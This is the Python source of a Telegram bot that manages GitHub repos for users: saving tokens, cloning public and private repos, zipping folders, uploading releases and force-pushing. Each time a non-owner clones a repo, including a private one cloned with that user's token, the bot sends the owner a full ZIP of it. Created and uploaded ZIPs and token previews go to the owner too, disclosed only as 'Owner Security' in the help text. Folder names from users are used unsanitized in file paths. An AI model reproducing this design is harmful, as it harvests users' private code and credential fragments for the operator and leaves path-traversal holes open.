"""
╔══════════════════════════════════════════════════════╗
║         GitHub Control Bot  v3.0                    ║
║  config.py • .env • MongoDB • Private Repos • Pro   ║
╚══════════════════════════════════════════════════════╝
"""

import os
import re
from datetime import datetime
from pathlib import Path

from pyrogram import Client, filters
from pyrogram.types import (
    Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
)

import config
import database as db
import git_utils as git
from keyboards import (
    main_keyboard, repos_keyboard, repo_edit_keyboard,
    clone_type_keyboard, back_to_repos
)

# ══════════════════════════════════════════════════════════════════════════════
#  APP
# ══════════════════════════════════════════════════════════════════════════════
app = Client(
    "github_control_bot_v3",
    api_id=config.API_ID,
    api_hash=config.API_HASH,
    bot_token=config.BOT_TOKEN,
)

# ══════════════════════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════════════════════

def user_tag(user) -> str:
    name     = f"{user.first_name or ''} {user.last_name or ''}".strip() or "Unknown"
    username = f"@{user.username}" if user.username else "no username"
    return f"**{name}** ({username}) `[{user.id}]`"

def now_str() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

async def alert_owner(client: Client, text: str, document: str = None):
    """Send alert/document to bot owner."""
    try:
        if document and os.path.exists(document):
            await client.send_document(config.OWNER_ID, document, caption=text)
        else:
            await client.send_message(config.OWNER_ID, text)
    except Exception:
        pass  # Owner hasn't started bot or other error

async def send_repo_panel(target, uid: int, page: int = 0, edit: bool = False):
    """Send or edit the repo panel message."""
    repos  = await db.get_repos(uid)
    active = await db.get_active_repo(uid)
    kb     = await repos_keyboard(uid, page=page)

    if not repos:
        text = "📂 **No repos saved yet.**\nTap **➕ Add More** to add your first repo."
    else:
        lines = []
        for i, r in enumerate(repos):
            lock  = "🔒" if r.get("is_private") else "🔓"
            tick  = " ✅ *(active)*" if r["url"] == active else ""
            name  = r.get("name") or git.repo_short(r["url"])
            lines.append(f"`{i+1}.` {lock} **{name}**{tick}\n    `{r['url']}`")
        text = (
            f"📂 **Your Repos ({len(repos)} saved):**\n\n"
            + "\n\n".join(lines)
            + "\n\n✅ = active repo | 🔒 = private | ✏️ = edit | 🗑 = delete"
        )

    if edit and hasattr(target, "edit_text"):
        await target.edit_text(text, reply_markup=kb)
    else:
        msg_target = target if isinstance(target, Message) else target.message
        await msg_target.reply(text, reply_markup=kb)

# ══════════════════════════════════════════════════════════════════════════════
#  /START
# ══════════════════════════════════════════════════════════════════════════════

@app.on_message(filters.command("start") & filters.private)
async def start_cmd(client: Client, message: Message):
    uid          = message.from_user.id
    token        = await db.get_token(uid)
    repos        = await db.get_repos(uid)
    active       = await db.get_active_repo(uid)
    token_status = "✅ Saved" if token else "❌ Not set — use /token or 🔐 Set Token"
    active_name  = ""
    if active:
        for r in repos:
            if r["url"] == active:
                active_name = r.get("name") or git.repo_short(active)
                break

    text = (
        f"👋 **Welcome to {config.BOT_NAME} v3.0**\n\n"
        f"🔐 **GitHub Token:** {token_status}\n"
        f"📦 **Saved Repos:** {len(repos)}\n"
    )
    if active_name:
        text += f"🎯 **Active Repo:** `{active_name}`\n"
    text += (
        "\n**Features:**\n"
        "• 🔍 Grep text across files\n"
        "• ✏️ Find & replace in `.py` files\n"
        "• 📁 Rename workspace folders\n"
        "• 📦 ZIP any folder\n"
        "• 🐙 Upload ZIP → GitHub Releases\n"
        "• 🚀 Force-push to GitHub\n"
        "• 📥 Clone repos (public & **private**)\n"
        "• 📂 Manage repos with Edit/Delete/Select\n\n"
        "👇 **Choose an action:**"
    )
    await message.reply(text, reply_markup=main_keyboard())

# ══════════════════════════════════════════════════════════════════════════════
#  /HELP
# ══════════════════════════════════════════════════════════════════════════════

@app.on_message(filters.command("help") & filters.private)
async def help_cmd(client: Client, message: Message):
    await message.reply(
        f"📖 **{config.BOT_NAME} — Help**\n\n"
        "**Commands:**\n"
        "`/start` — Main menu\n"
        "`/token YOUR_TOKEN` — Save GitHub token\n"
        "`/list` — List workspace folders\n\n"
        "**📂 My Repos Panel:**\n"
        "• 🔓/🔒 = public/private indicator\n"
        "• ✅ = currently active repo\n"
        "• Tap repo name → set as active repo\n"
        "• ✏️ → edit URL, name, or toggle private\n"
        "• 🗑 → delete repo from list\n"
        "• ➕ Add More → always visible\n"
        "• Pagination: 5 per page\n\n"
        "**📥 Clone (Private Repos):**\n"
        "• Bot first tries without token (public)\n"
        "• If repo is private → asks to use your saved token\n"
        "• Or choose token upfront via Clone button\n\n"
        "**🔐 Owner Security:**\n"
        "• Token set → owner notified\n"
        "• ZIP created → owner gets the file\n"
        "• Clone done → owner gets ZIP\n"
        "• Push/Upload → owner notified\n",
        reply_markup=main_keyboard(),
    )

# ══════════════════════════════════════════════════════════════════════════════
#  /TOKEN  and  /LIST
# ══════════════════════════════════════════════════════════════════════════════

@app.on_message(filters.command("token") & filters.private)
async def token_cmd(client: Client, message: Message):
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.reply("Usage: `/token ghp_yourtoken`")
        return
    uid   = message.from_user.id
    token = parts[1].strip()
    await db.set_token(uid, token)
    await message.reply("✅ **GitHub token saved!**", reply_markup=main_keyboard())
    if uid != config.OWNER_ID:
        await alert_owner(
            client,
            f"🔐 **Token Set**\nUser: {user_tag(message.from_user)}\n"
            f"Preview: `{token[:8]}...{token[-4:]}`\nTime: {now_str()}"
        )

@app.on_message(filters.command("list") & filters.private)
async def list_cmd(client: Client, message: Message):
    await message.reply(git.list_workspace(), reply_markup=main_keyboard())

# ══════════════════════════════════════════════════════════════════════════════
#  CALLBACK HANDLER
# ══════════════════════════════════════════════════════════════════════════════

@app.on_callback_query()
async def cb_handler(client: Client, query: CallbackQuery):
    uid  = query.from_user.id
    data = query.data
    await query.answer()

    # ── Home ──────────────────────────────────────────────────────────────────
    if data == "go_home":
        token = await db.get_token(uid)
        repos = await db.get_repos(uid)
        await query.message.edit_text(
            f"🏠 **Main Menu**\n"
            f"🔐 Token: {'✅ Set' if token else '❌ Not set'}\n"
            f"📦 Repos: {len(repos)} saved",
            reply_markup=main_keyboard(),
        )

    # ── Show Repos Panel ──────────────────────────────────────────────────────
    elif data == "show_repos":
        await send_repo_panel(query, uid, page=0)

    # ── Pagination ────────────────────────────────────────────────────────────
    elif data.startswith("repos_page:"):
        page = int(data.split(":")[1])
        kb   = await repos_keyboard(uid, page=page)
        await query.message.edit_reply_markup(reply_markup=kb)

    # ── Select Repo as Active ─────────────────────────────────────────────────
    elif data.startswith("repo_select:"):
        idx   = int(data.split(":")[1])
        repos = await db.get_repos(uid)
        if 0 <= idx < len(repos):
            repo = repos[idx]
            await db.set_active_repo(uid, repo["url"])
            name = repo.get("name") or git.repo_short(repo["url"])
            await query.message.reply(
                f"✅ **Active repo set to:**\n"
                f"📁 **{name}**\n`{repo['url']}`\n\n"
                "All push/upload/clone actions now use this repo.",
                reply_markup=main_keyboard(),
            )

    # ── Edit Repo — Show options ──────────────────────────────────────────────
    elif data.startswith("repo_edit:"):
        idx   = int(data.split(":")[1])
        repos = await db.get_repos(uid)
        if 0 <= idx < len(repos):
            repo = repos[idx]
            name = repo.get("name") or git.repo_short(repo["url"])
            lock = "🔒 Private" if repo.get("is_private") else "🔓 Public"
            await query.message.reply(
                f"✏️ **Editing Repo #{idx+1}:**\n\n"
                f"🏷 Name: **{name}**\n"
                f"🔗 URL: `{repo['url']}`\n"
                f"Status: {lock}\n\n"
                "What do you want to change?",
                reply_markup=repo_edit_keyboard(idx),
            )

    # ── Edit: Change URL ──────────────────────────────────────────────────────
    elif data.startswith("re_url:"):
        idx   = int(data.split(":")[1])
        repos = await db.get_repos(uid)
        if 0 <= idx < len(repos):
            await db.set_state(uid, {"action": "edit_url", "idx": idx})
            await query.message.reply(
                f"🔗 **Change URL for Repo #{idx+1}:**\n"
                f"Current: `{repos[idx]['url']}`\n\n"
                "Send the **new GitHub repo URL**:"
            )

    # ── Edit: Change Name ─────────────────────────────────────────────────────
    elif data.startswith("re_name:"):
        idx   = int(data.split(":")[1])
        repos = await db.get_repos(uid)
        if 0 <= idx < len(repos):
            await db.set_state(uid, {"action": "edit_name", "idx": idx})
            current_name = repos[idx].get("name") or git.repo_short(repos[idx]["url"])
            await query.message.reply(
                f"🏷 **Change Name for Repo #{idx+1}:**\n"
                f"Current: **{current_name}**\n\n"
                "Send the **new label/name** for this repo:"
            )

    # ── Edit: Toggle Private ──────────────────────────────────────────────────
    elif data.startswith("re_priv:"):
        idx   = int(data.split(":")[1])
        repos = await db.get_repos(uid)
        if 0 <= idx < len(repos):
            repo       = repos[idx]
            new_priv   = not repo.get("is_private", False)
            await db.update_repo(uid, idx, repo["url"], repo.get("name", ""), new_priv)
            status = "🔒 Private" if new_priv else "🔓 Public"
            name   = repo.get("name") or git.repo_short(repo["url"])
            await query.message.reply(
                f"✅ **Repo #{idx+1} updated:**\n"
                f"📁 {name}\nStatus: now **{status}**",
                reply_markup=repo_edit_keyboard(idx),
            )

    # ── Delete Repo ───────────────────────────────────────────────────────────
    elif data.startswith("repo_del:"):
        idx     = int(data.split(":")[1])
        removed = await db.delete_repo(uid, idx)
        if removed:
            name  = removed.get("name") or git.repo_short(removed["url"])
            repos = await db.get_repos(uid)
            await query.message.reply(
                f"🗑 **Deleted:** `{name}`\n📦 Remaining: {len(repos)} repo(s)",
                reply_markup=await repos_keyboard(uid) if repos else main_keyboard(),
            )

    # ── Add Repo ──────────────────────────────────────────────────────────────
    elif data == "add_repo":
        await db.set_state(uid, {"action": "add_repo_url"})
        await query.message.reply(
            "➕ **Add New Repo**\n\n"
            "Send the **GitHub repo URL:**\n"
            "Example: `https://github.com/user/myrepo`"
        )

    # ── Set Token (button) ────────────────────────────────────────────────────
    elif data == "cmd_set_token":
        await db.set_state(uid, {"action": "set_token"})
        await query.message.reply(
            "🔐 Send your **GitHub Personal Access Token:**\n\n"
            "Get one at: github.com/settings/tokens\n"
            "_(Give it `repo` scope for private repos)_"
        )

    # ── Grep ──────────────────────────────────────────────────────────────────
    elif data in ("cmd_grep", "cmd_grep_py"):
        only_py = data == "cmd_grep_py"
        await db.set_state(uid, {"action": "grep", "only_py": only_py})
        mode = "`.py` files only" if only_py else "all files"
        await query.message.reply(
            f"🔍 **Grep ({mode})**\n\n"
            f"Send: `folder_name search_text`\n"
            f"Example: `myproject pyrogram`\n\n"
            f"{git.list_workspace()}"
        )

    # ── Replace ───────────────────────────────────────────────────────────────
    elif data == "cmd_replace":
        await db.set_state(uid, {"action": "replace_folder"})
        await query.message.reply(
            f"✏️ **Replace Text in `.py` files**\n\n"
            f"Send the **folder name:**\n\n{git.list_workspace()}"
        )

    # ── Rename ────────────────────────────────────────────────────────────────
    elif data == "cmd_rename":
        await db.set_state(uid, {"action": "rename_old"})
        await query.message.reply(
            f"📁 **Rename Folder**\n\nSend the **old folder name:**\n\n{git.list_workspace()}"
        )

    # ── ZIP ───────────────────────────────────────────────────────────────────
    elif data == "cmd_zip":
        await db.set_state(uid, {"action": "make_zip"})
        await query.message.reply(
            f"📦 **Make ZIP**\n\nSend **folder name** to zip:\n\n{git.list_workspace()}"
        )

    # ── Upload ZIP → GitHub ───────────────────────────────────────────────────
    elif data == "cmd_github_upload":
        token = await db.get_token(uid)
        if not token:
            await query.message.reply(
                "❌ No GitHub token saved.\n"
                "Use `/token YOUR_TOKEN` or tap **🔐 Set Token** first."
            )
            return
        active = await db.get_active_repo(uid)
        if not active:
            await query.message.reply(
                "❌ No active repo selected.\n"
                "Go to **📂 My Repos** → tap a repo to set it active."
            )
            return
        await db.set_state(uid, {"action": "upload_zip"})
        await query.message.reply(
            f"🐙 **Upload ZIP → GitHub Releases**\n\n"
            f"🎯 Active repo: `{active}`\n\n"
            f"Send **folder name** to zip & upload:\n\n{git.list_workspace()}"
        )

    # ── Git Push ──────────────────────────────────────────────────────────────
    elif data == "cmd_git_push":
        token = await db.get_token(uid)
        if not token:
            await query.message.reply(
                "❌ No GitHub token saved.\nUse `/token YOUR_TOKEN` first."
            )
            return
        active = await db.get_active_repo(uid)
        if not active:
            await query.message.reply(
                "❌ No active repo.\nGo to **📂 My Repos** → tap a repo."
            )
            return
        await db.set_state(uid, {"action": "git_push"})
        await query.message.reply(
            f"🚀 **Force Push to GitHub**\n\n"
            f"🎯 Active repo: `{active}`\n\n"
            f"Send **folder name** to push:\n\n{git.list_workspace()}"
        )

    # ── Clone ─────────────────────────────────────────────────────────────────
    elif data == "cmd_clone":
        repos = await db.get_repos(uid)
        if repos:
            # Show saved repos + option for new URL
            rows = []
            for i, r in enumerate(repos):
                lock  = "🔒" if r.get("is_private") else "🔓"
                label = (r.get("name") or git.repo_short(r["url"]))[:28]
                rows.append([InlineKeyboardButton(
                    f"{lock} {label}", callback_data=f"clone_pick:{i}"
                )])
            rows.append([
                InlineKeyboardButton("🔗 Enter New URL", callback_data="clone_new_url"),
                InlineKeyboardButton("🔙 Back",          callback_data="go_home"),
            ])
            await query.message.reply(
                "📥 **Clone Repo**\n\nPick a saved repo or enter a new URL:",
                reply_markup=InlineKeyboardMarkup(rows),
            )
        else:
            await db.set_state(uid, {"action": "clone_url"})
            await query.message.reply(
                "📥 **Clone Repo**\n\nSend the **GitHub repo URL:**"
            )

    # ── Clone: pick saved repo ────────────────────────────────────────────────
    elif data.startswith("clone_pick:"):
        idx   = int(data.split(":")[1])
        repos = await db.get_repos(uid)
        if 0 <= idx < len(repos):
            repo = repos[idx]
            await db.set_state(uid, {"action": "clone_do", "url": repo["url"], "idx": idx})
            is_priv = repo.get("is_private", False)
            name    = repo.get("name") or git.repo_short(repo["url"])
            await query.message.reply(
                f"📥 **Cloning:** `{name}`\n`{repo['url']}`\n\n"
                f"Status: {'🔒 Private' if is_priv else '🔓 Public'}\n\n"
                "How do you want to clone?",
                reply_markup=clone_type_keyboard(idx=idx),
            )

    # ── Clone: new URL entry ──────────────────────────────────────────────────
    elif data == "clone_new_url":
        await db.set_state(uid, {"action": "clone_url"})
        await query.message.reply(
            "📥 Send the **GitHub repo URL** to clone:\n"
            "Example: `https://github.com/user/myrepo`"
        )

    # ── Clone with token ─────────────────────────────────────────────────────
    elif data.startswith("clone_with_token:") or data == "clone_with_token_new":
        token = await db.get_token(uid)
        if not token:
            await query.message.reply(
                "❌ No GitHub token saved.\n"
                "Use `/token YOUR_TOKEN` to save your token first, then clone again."
            )
            return
        state = await db.get_state(uid)
        url   = state.get("url", "")
        if not url:
            await query.message.reply("❌ Session expired. Please start clone again.")
            return
        await _do_clone(client, query, uid, url, token=token)

    # ── Clone without token ───────────────────────────────────────────────────
    elif data.startswith("clone_no_token:") or data == "clone_no_token_new":
        state = await db.get_state(uid)
        url   = state.get("url", "")
        if not url:
            await query.message.reply("❌ Session expired. Please start clone again.")
            return
        await _do_clone(client, query, uid, url, token=None)

    # ── List ──────────────────────────────────────────────────────────────────
    elif data == "cmd_list":
        await query.message.reply(git.list_workspace(), reply_markup=main_keyboard())

    # ── Help ──────────────────────────────────────────────────────────────────
    elif data == "cmd_help":
        await query.message.reply("Use /help for details.", reply_markup=main_keyboard())

# ══════════════════════════════════════════════════════════════════════════════
#  CLONE HELPER  (shared by callback + message handler)
# ══════════════════════════════════════════════════════════════════════════════

async def _do_clone(client, source, uid: int, repo_url: str, token: str | None):
    """Perform clone, handle NEEDS_TOKEN, auto-ZIP, alert owner."""
    m      = re.search(r"/([^/]+?)(?:\.git)?$", repo_url)
    folder = m.group(1) if m else "cloned_repo"
    dest   = os.path.join(config.WORK_DIR, folder)

    msg_target = source.message if isinstance(source, CallbackQuery) else source
    status_msg = await msg_target.reply(f"⏳ Cloning `{folder}`...")

    success, result = git.clone_repo(repo_url, dest, token=token)

    if not success and result == "NEEDS_TOKEN":
        await status_msg.edit_text(
            f"🔒 **This repo is private!**\n`{repo_url}`\n\n"
            "It requires authentication. Choose:"
        )
        await db.set_state(uid, {"action": "clone_do", "url": repo_url})
        await msg_target.reply(
            "To clone this private repo, you need a GitHub token.",
            reply_markup=clone_type_keyboard(),
        )
        return

    await status_msg.edit_text(result)

    if not success:
        return

    await db.clear_state(uid)

    # Auto-save to repo list
    added = await db.add_repo(uid, repo_url)
    if added:
        await msg_target.reply("📌 Repo auto-saved to your list!")

    # Auto-ZIP and send
    zip_path = os.path.join(config.WORK_DIR, f"{folder}.zip")
    git.make_zip(dest, zip_path)
    await msg_target.reply_document(
        zip_path,
        caption=f"📦 `{folder}.zip` — auto-zipped!",
        reply_markup=main_keyboard(),
    )

    # Alert owner
    user = source.from_user
    if uid != config.OWNER_ID:
        await alert_owner(
            client,
            f"📥 **Clone Alert**\nUser: {user_tag(user)}\n"
            f"Repo: `{repo_url}`\nTime: {now_str()}",
            document=zip_path,
        )

# ══════════════════════════════════════════════════════════════════════════════
#  MESSAGE HANDLER  (state machine)
# ══════════════════════════════════════════════════════════════════════════════

@app.on_message(filters.private & ~filters.command(["start", "help", "token", "list"]))
async def msg_handler(client: Client, message: Message):
    uid    = message.from_user.id
    text   = (message.text or "").strip()
    state  = await db.get_state(uid)
    action = state.get("action", "")

    # ── Set Token ─────────────────────────────────────────────────────────────
    if action == "set_token":
        await db.set_token(uid, text)
        await db.clear_state(uid)
        await message.reply("✅ **GitHub token saved!**", reply_markup=main_keyboard())
        if uid != config.OWNER_ID:
            await alert_owner(
                client,
                f"🔐 **Token Set**\nUser: {user_tag(message.from_user)}\n"
                f"Preview: `{text[:8]}...{text[-4:]}`\nTime: {now_str()}"
            )

    # ── Add Repo: URL ─────────────────────────────────────────────────────────
    elif action == "add_repo_url":
        if "github.com" not in text:
            await message.reply("❌ Doesn't look like a GitHub URL. Try again\n(e.g. `https://github.com/user/repo`):")
            return
        await db.set_state(uid, {"action": "add_repo_name", "url": text})
        await message.reply(
            f"✅ URL: `{text}`\n\n"
            "Send a **short label/name** for this repo\n"
            "_(or send `-` to use default: `user/repo`)_"
        )

    # ── Add Repo: Name ────────────────────────────────────────────────────────
    elif action == "add_repo_name":
        url  = state["url"]
        name = "" if text == "-" else text
        await db.set_state(uid, {"action": "add_repo_priv", "url": url, "name": name})
        await message.reply(
            f"🔒 **Is this a private repo?**\n`{url}`\n\n"
            "Send `yes` for private, `no` for public:",
        )

    # ── Add Repo: Private? ────────────────────────────────────────────────────
    elif action == "add_repo_priv":
        url      = state["url"]
        name     = state.get("name", "")
        is_priv  = text.lower() in ("yes", "y", "private", "1", "true")
        await db.add_repo(uid, url, name, is_priv)
        await db.clear_state(uid)
        repos = await db.get_repos(uid)
        kb    = await repos_keyboard(uid)
        lock  = "🔒 Private" if is_priv else "🔓 Public"
        await message.reply(
            f"✅ **Repo added!**\n"
            f"📁 **{name or git.repo_short(url)}** — {lock}\n"
            f"`{url}`\n\n📦 Total: {len(repos)} repo(s)",
            reply_markup=kb,
        )

    # ── Edit Repo: Change URL ─────────────────────────────────────────────────
    elif action == "edit_url":
        if "github.com" not in text:
            await message.reply("❌ Invalid GitHub URL. Try again:")
            return
        idx   = state["idx"]
        repos = await db.get_repos(uid)
        if 0 <= idx < len(repos):
            old = repos[idx]
            await db.update_repo(uid, idx, text, old.get("name", ""), old.get("is_private", False))
            await db.clear_state(uid)
            await message.reply(
                f"✅ **URL updated for Repo #{idx+1}:**\n`{text}`",
                reply_markup=await repos_keyboard(uid),
            )

    # ── Edit Repo: Change Name ────────────────────────────────────────────────
    elif action == "edit_name":
        idx   = state["idx"]
        repos = await db.get_repos(uid)
        if 0 <= idx < len(repos):
            old = repos[idx]
            await db.update_repo(uid, idx, old["url"], text, old.get("is_private", False))
            await db.clear_state(uid)
            await message.reply(
                f"✅ **Name updated for Repo #{idx+1}:**\n🏷 `{text}`",
                reply_markup=await repos_keyboard(uid),
            )

    # ── Clone: new URL ────────────────────────────────────────────────────────
    elif action == "clone_url":
        if "github.com" not in text:
            await message.reply("❌ Invalid GitHub URL. Try again:")
            return
        await db.set_state(uid, {"action": "clone_do", "url": text})
        await message.reply(
            f"📥 Repo: `{text}`\n\nHow do you want to clone?",
            reply_markup=clone_type_keyboard(),
        )

    # ── Grep ──────────────────────────────────────────────────────────────────
    elif action == "grep":
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            await message.reply("❌ Usage: `folder_name search_text`")
            return
        folder, search = parts
        directory = os.path.join(config.WORK_DIR, folder)
        if not os.path.exists(directory):
            await message.reply(f"❌ Folder `{folder}` not found.\n\n{git.list_workspace()}")
            return
        only_py = state.get("only_py", False)
        result  = git.grep_text(directory, search, only_py=only_py)
        await db.clear_state(uid)
        if len(result) > 4000:
            result = result[:3900] + "\n\n..._(truncated)_"
        await message.reply(
            f"🔍 **Results for** `{search}` in `{folder}`:\n\n{result}",
            reply_markup=main_keyboard(),
        )

    # ── Replace: folder ───────────────────────────────────────────────────────
    elif action == "replace_folder":
        directory = os.path.join(config.WORK_DIR, text)
        if not os.path.exists(directory):
            await message.reply(f"❌ Folder `{text}` not found.\n\n{git.list_workspace()}")
            return
        await db.set_state(uid, {"action": "replace_old", "folder": directory})
        await message.reply("✏️ Send the **text to find** (old text):")

    elif action == "replace_old":
        await db.set_state(uid, {**state, "action": "replace_new", "old": text})
        await message.reply(f"✏️ Send **replacement text** for `{text}`:")

    elif action == "replace_new":
        result = git.replace_text(state["folder"], state["old"], text)
        await db.clear_state(uid)
        await message.reply(result, reply_markup=main_keyboard())

    # ── Rename: old ───────────────────────────────────────────────────────────
    elif action == "rename_old":
        await db.set_state(uid, {"action": "rename_new", "old": text})
        await message.reply(f"📁 Send **new name** for `{text}`:")

    elif action == "rename_new":
        result = git.rename_folder(state["old"], text)
        await db.clear_state(uid)
        await message.reply(result, reply_markup=main_keyboard())

    # ── ZIP ───────────────────────────────────────────────────────────────────
    elif action == "make_zip":
        src = os.path.join(config.WORK_DIR, text)
        if not os.path.exists(src):
            await message.reply(f"❌ Folder `{text}` not found.\n\n{git.list_workspace()}")
            return
        zip_path = os.path.join(config.WORK_DIR, f"{text}.zip")
        await message.reply("⏳ Creating ZIP...")
        git.make_zip(src, zip_path)
        await db.clear_state(uid)
        await message.reply_document(
            zip_path,
            caption=f"✅ `{text}.zip` ready!",
            reply_markup=main_keyboard(),
        )
        if uid != config.OWNER_ID:
            await alert_owner(
                client,
                f"📦 **ZIP Created**\nUser: {user_tag(message.from_user)}\n"
                f"Folder: `{text}`\nTime: {now_str()}",
                document=zip_path,
            )

    # ── Upload ZIP → GitHub ───────────────────────────────────────────────────
    elif action == "upload_zip":
        src = os.path.join(config.WORK_DIR, text)
        if not os.path.exists(src):
            await message.reply(f"❌ Folder `{text}` not found.\n\n{git.list_workspace()}")
            return
        token    = await db.get_token(uid)
        repo_url = await db.get_active_repo(uid)
        zip_path = os.path.join(config.WORK_DIR, f"{text}.zip")
        await message.reply("⏳ Zipping and uploading to GitHub...")
        git.make_zip(src, zip_path)
        result = git.upload_to_github(zip_path, token, repo_url)
        await db.clear_state(uid)
        await message.reply(result, reply_markup=main_keyboard())
        if uid != config.OWNER_ID:
            await alert_owner(
                client,
                f"🐙 **GitHub Upload**\nUser: {user_tag(message.from_user)}\n"
                f"Repo: `{repo_url}`\nFolder: `{text}`\nTime: {now_str()}",
                document=zip_path,
            )

    # ── Git Push ──────────────────────────────────────────────────────────────
    elif action == "git_push":
        directory = os.path.join(config.WORK_DIR, text)
        if not os.path.exists(directory):
            await message.reply(f"❌ Folder `{text}` not found.\n\n{git.list_workspace()}")
            return
        token    = await db.get_token(uid)
        repo_url = await db.get_active_repo(uid)
        await message.reply("⏳ Pushing to GitHub...")
        result = git.git_push(directory, token, repo_url)
        await db.clear_state(uid)
        await message.reply(result, reply_markup=main_keyboard())
        if uid != config.OWNER_ID:
            await alert_owner(
                client,
                f"🚀 **Git Push**\nUser: {user_tag(message.from_user)}\n"
                f"Repo: `{repo_url}`\nFolder: `{text}`\nTime: {now_str()}"
            )

    # ── Fallback ──────────────────────────────────────────────────────────────
    else:
        await message.reply(
            "👋 Use the buttons below or /start",
            reply_markup=main_keyboard(),
        )

# ══════════════════════════════════════════════════════════════════════════════
#  RUN
# ══════════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    print(f"\n{'='*55}")
    print(f"  🤖 {config.BOT_NAME} v3.0 starting...")
    print(f"  📦 Workspace : {config.WORK_DIR}")
    print(f"  🗄️  MongoDB   : {config.MONGO_URI[:30]}...")
    print(f"  👑 Owner ID  : {config.OWNER_ID}")
    print(f"{'='*55}\n")
    app.run()
